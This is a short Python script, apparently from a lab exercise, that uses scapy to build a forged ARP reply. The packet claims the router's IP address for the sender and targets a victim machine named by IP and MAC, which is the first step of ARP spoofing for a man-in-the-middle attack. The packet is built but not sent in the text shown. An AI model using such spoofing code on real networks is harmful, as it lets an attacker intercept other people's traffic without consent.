#!/usr/bin/env python

import scapy.all as scapy

#pdst - is vic machine - hwdst - vic MAC - psrc - ip of router
packet = scapy.ARP(op=2, pdst="192.168.226.138", hwdst="00:0c:29:6e:d1:81", psrc="192.168.226.2")